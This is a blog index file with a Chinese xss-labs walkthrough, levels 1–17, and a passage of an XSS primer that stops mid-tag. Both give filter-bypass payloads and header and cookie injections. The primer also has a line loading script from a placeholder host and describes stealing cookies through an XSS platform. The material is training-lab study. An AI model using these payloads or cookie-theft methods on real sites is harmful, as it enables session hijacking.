<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>xss-labs</title>
    <link href="/2023/03/18/xss-labs-1/"/>
    <url>/2023/03/18/xss-labs-1/</url>
    
    <content type="html"><![CDATA[<h1 id="xss-labs"><a href="#xss-labs" class="headerlink" title="xss-labs"></a>xss-labs</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><script>alert('xss')</script><p>没有经过特殊的处理，直接返回</p><p>参数会插入到标题中</p><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>第二关多了搜索框，第一关的语句输入</p><p><img src="/2023/03/18/xss-labs-1/image-20230315220427239.png" alt="image-20230315220427239"></p><p>返回语句但是不显示过关，看一下源代码</p><p><img src="/2023/03/18/xss-labs-1/image-20230315220644774.png" alt="image-20230315220644774"></p><p>可以选择先闭合input标签然后输入语句</p><p>value是双引号闭合</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>输入第二关的语句查看源代码</p><p><img src="/2023/03/18/xss-labs-1/image-20230315220939136.png" alt="image-20230315220939136"></p><p>这是可以考虑单引号加onmouseover</p><p> onmouseover事件：指鼠标移动都某个指点的HTML标签上，会出现指定的效果</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&#x27;onmouseover=&#x27;alert(/xss/)<br>&#x27; onmouseover=javascript:alert(1) &#x27;<br></code></pre></td></tr></table></figure><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>这个题的value的闭合方式是双引号所以这个题转变为双引号即可</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;onmouseover=&quot;alert(/xss/)<br>&quot;onmouseover=javascript:alert(1)&quot;<br></code></pre></td></tr></table></figure><p><img src="/2023/03/18/xss-labs-1/image-20230315222335358.png" alt="image-20230315222335358"></p><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>将第二题和第三题的语句输入查看源代码</p><p><img src="/2023/03/18/xss-labs-1/image-20230315222518099.png" alt="image-20230315222518099"></p><p><img src="/2023/03/18/xss-labs-1/image-20230315222552011.png" alt="image-20230315222552011"></p><p>使用javascript伪协议<a href="https://www.cnblogs.com/lcyuhe/p/6409379.html">JavaScript中伪协议 - #天行健# - 博客园 (cnblogs.com)</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><br></code></pre></td></tr></table></figure><p>构造闭合后新建一个a标签，在其中使用伪协议进行绕过。</p><h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p><img src="/2023/03/18/xss-labs-1/image-20230316231027974.png" alt="image-20230316231027974"></p><p>经过测试，大小写可以绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">SCRIPT</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p><img src="/2023/03/18/xss-labs-1/image-20230316231536484.png" alt="image-20230316231536484"></p><p>经过测试前几个语句发现，有的被过滤有的不能执行，猜测可能可以使用双写绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">scscriptript</span>&gt;</span>alert(&#x27;xss&#x27;)<span class="hljs-tag">&lt;/<span class="hljs-name">scscriptript</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p><img src="/2023/03/18/xss-labs-1/image-20230316231922512.png" alt="image-20230316231922512"></p><p>经过测试大小写，双写等都进行了过滤。使用之前介绍的编码绕过，这里使用unicode绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">编码前<br><span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)<br>编码后<br>&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">58</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">40</span>;&amp;#<span class="hljs-number">39</span>;&amp;#<span class="hljs-number">120</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">39</span>;&amp;#<span class="hljs-number">41</span>; <br></code></pre></td></tr></table></figure><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p><img src="/2023/03/18/xss-labs-1/image-20230318110254828.png" alt="image-20230318110254828"></p><p><img src="/2023/03/18/xss-labs-1/image-20230318110419747.png" alt="image-20230318110419747"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">javascript:alert(&#x27;xss&#x27;)http://www.baidu.com<br></code></pre></td></tr></table></figure><p><img src="/2023/03/18/xss-labs-1/image-20230318110533849.png" alt="image-20230318110533849"></p><p>使用unicode编码http前边的语句，但是发现不能成功的返回，经过查资料发现需要将http:&#x2F;&#x2F;注释掉</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-symbol">&amp;#106;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#58;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#39;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#39;</span><span class="hljs-symbol">&amp;#41;</span> /* http://www.baidu.com */<br></code></pre></td></tr></table></figure><p>查看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level10.php?keyword=well done!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level9&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//各种过滤</span><br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,<span class="hljs-variable">$str6</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level9.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//判断是否含有http://</span><br><span class="hljs-keyword">if</span>(<span class="hljs-literal">false</span>===<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str7</span>,<span class="hljs-string">&#x27;http://&#x27;</span>))    <br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>        &#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="hljs-variable">$str7</span>.<span class="hljs-string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str7</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>strpos — 查找字符串首次出现的位置</p><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>经过测试，还是过滤了许多字符，查看下源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br></code></pre></td></tr></table></figure><p>.htmlspecialchars($str).   keyword传入得str被实体化</p><input name="t_sort" value="'.$str33.'" type="hidden"><p>隐藏的input标签，接受str33，使用t_sort传参，其中&lt;&gt;被空格代替，所以不能闭合input</p><p>可以使用input中的onfocus,由于输入框被隐藏，需要使用type&#x3D;’text’恢复</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;onfocus=javascript:alert(&#x27;xss&#x27;) type=&quot;text<br></code></pre></td></tr></table></figure><p><img src="/2023/03/18/xss-labs-1/image-20230318113807636.png" alt="image-20230318113807636"></p><h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><p><img src="/2023/03/18/xss-labs-1/image-20230318114351329.png" alt="image-20230318114351329"></p><p>这个有点像referer的参数（就是记录通过什么地址转跳到这里的），这关我才会和这个有关系，抓包</p><p><img src="/2023/03/18/xss-labs-1/image-20230318114919208.png" alt="image-20230318114919208"></p><p>在referer中插入上关的语句即可</p><p><img src="/2023/03/18/xss-labs-1/image-20230318115124656.png" alt="image-20230318115124656"></p><h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p><img src="/2023/03/18/xss-labs-1/image-20230318115229308.png" alt="image-20230318115229308"></p><p>这个是user-agent头，修改为上关语句即可</p><p><img src="/2023/03/18/xss-labs-1/image-20230318115458947.png" alt="image-20230318115458947"></p><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><p><img src="/2023/03/18/xss-labs-1/image-20230318115912276.png" alt="image-20230318115912276"></p><p>这次是cookie</p><p>以前的语句仍然有效，还可以使用</p><p>“ onclick&#x3D;alert(‘xss’) type&#x3D;”text </p><p>onclick 事件在用户单击元素时发生。</p><h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>题目给的网站出现问题，这题本来是利用转跳到的网站，在那网站去上传一个，属性里面含有xss代码的图片，以达到弹窗的效果</p><h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html ng-app&gt;<br><br>&lt;head&gt;<br><br>        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br><br>        &lt;script src=<span class="hljs-string">&quot;angular.min.js&quot;</span>&gt;&lt;/script&gt;<br><br>&lt;script&gt;<br><br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span><br><span class="hljs-function"></span>&#123;   <br><br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br><br> window.location.href=<span class="hljs-string">&quot;level16.php?keyword=test&quot;</span>; <br><br>&#125;<br><br>&lt;/script&gt;<br><br>&lt;title&gt;欢迎来到level15&lt;/title&gt;<br><br>&lt;/head&gt;<br><br>&lt;h1 align=center&gt;欢迎来到第<span class="hljs-number">15</span>关，自己想个办法走出去吧！&lt;/h1&gt;<br><br>&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;<br><br><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;src&quot;</span>];<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>get传参src</p><p>ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号</p><p>特别值得注意的几点如下： </p><ul><li>1.ng-include,如果单纯指定地址，必须要加引号</li><li>2.ng-include,加载外部html，script标签中的内容不执行</li><li>3.ng-include,加载外部html中含有style标签样式可以识别</li></ul><p>尝试包含第一关</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">?src=&#x27;level1.php&#x27;<br>/* 构造语句*/<br>?src=&#x27;level1.php?name<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span>&#x27;<br></code></pre></td></tr></table></figure><h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>经过测试script,&#x2F;,空格等都被过滤了，</p><p>空格可以用回车代替（url编码:%0a），使用不需要闭合的标签，比如<img>、<details>、<svg>等标签，</svg></details></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?keyword=&lt;img%0asrc=<span class="hljs-string">&#x27;111&#x27;</span>%0aonerror=alert(<span class="hljs-string">&#x27;xss&#x27;</span>)&gt;<br></code></pre></td></tr></table></figure><h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p><img src="/2023/03/18/xss-labs-1/image-20230318222752268.png" alt="image-20230318222752268"></p><p>传入的参数都出现在了embed标签上，打开后缀名为swf的文件（FLASH插件的文件，现在很多浏览器都不支持FLASH插件了）</p><p>embed标签可以理解为定义了一个区域，可以放图片、视频、音频等内容，但是呢相对于他们，embed标签打开不了文件的时候就会没有显示的区域在，他们就能有块错误的区域 再看一下onfocus和onclick事件，这两事件是等价的，都是一触即发</p><p>解决这个题需要一个支持flash的浏览器，可以把源代码中的swf文件改掉</p><p><img src="/2023/03/18/xss-labs-1/image-20230318223416502.png" alt="image-20230318223416502"></p><p>传参arg02</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?arg02= <span class="hljs-attribute">onclick</span>=alert()<br></code></pre></td></tr></table></figure><p>18,19,20这几关用到flash xss由于浏览器不支持flash就不做了先，挂个链接看看</p><p><a href="https://blog.csdn.net/u014029795/article/details/103213877">(110条消息) XSS-labs Level 19 Flash XSS_xss-labs level19_baynk的博客-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>xss</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss基础</title>
    <link href="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/"/>
    <url>/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/</url>
    
    <content type="html"><![CDATA[<h2 id="XSS基础"><a href="#XSS基础" class="headerlink" title="XSS基础"></a>XSS基础</h2><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> XSS又叫CSS（Cross Site Script）跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p><p> xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。<br>常见的输出函数有： echo printf print print_r sprintf die var-dump var_export.</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）。<br>诱使受害者打开受到攻击的服务器URL。<br>受害者在Web浏览器中打开URL，恶意脚本执行。</p><h2 id="攻击类型"><a href="#攻击类型" class="headerlink" title="攻击类型"></a>攻击类型</h2><p>反射型XSS：&lt;非持久化&gt; 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。一般是后端代码进行处理</p><p>存储型XSS：&lt;持久化&gt; 代码是存储在服务器数据库中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。</p><p>DOM型XSS：基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。一般是浏览器前端代码进行处理。</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>1.挂马<br>2.盗取用户Cookie。<br>3.DOS（拒绝服务）客户端浏览器。<br>4.钓鱼攻击，高级的钓鱼技巧。<br>5.删除目标文章、恶意篡改数据、嫁祸。<br>6.劫持用户Web行为，甚至进一步渗透内网。<br>7.爆发Web2.0蠕虫。<br>8.蠕虫式的DDoS攻击。<br>9.蠕虫式挂马攻击、刷广告、刷浏量、破坏网上数据<br>10.其它安全问题</p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>1.搭建xss平台收集cookie</p><p>2.对于反射型可以构造链接，当用户点击时，用户的cookie会被发到xss平台</p><p>3.窃取用户的cookie后可以基于xss平台进行利用</p><h2 id="搭建闯关平台-xss-labs"><a href="#搭建闯关平台-xss-labs" class="headerlink" title="搭建闯关平台(xss-labs)"></a>搭建闯关平台(xss-labs)</h2><p>首先下载源码包<a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></p><p>搭建PHPstudy环境，推荐使用phpstudy2018的版本</p><p>将源码包解压到www目录下就可以</p><p><img src="/2023/03/18/xss%E5%9F%BA%E7%A1%80-0/image-20230311165719232.png" alt="image-20230311165719232"></p><h2 id="常用的标签和属性"><a href="#常用的标签和属性" class="headerlink" title="常用的标签和属性"></a>常用的标签和属性</h2><h3 id="scirpt"><a href="#scirpt" class="headerlink" title="scirpt"></a>scirpt</h3><script> 标签用于定义客户端脚本，比如 JavaScript。<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;hack&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   #弹出hack<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/hack/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   #弹出hack<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>        #弹出1，对于数字可以不用引号<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>      #弹出cookie<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://xxx.com/xss.js</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>  #引用外部的xss<br></code></pre></td></tr></table></figure>### img<img> 标签定义 HTML 页面中的图像。<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span 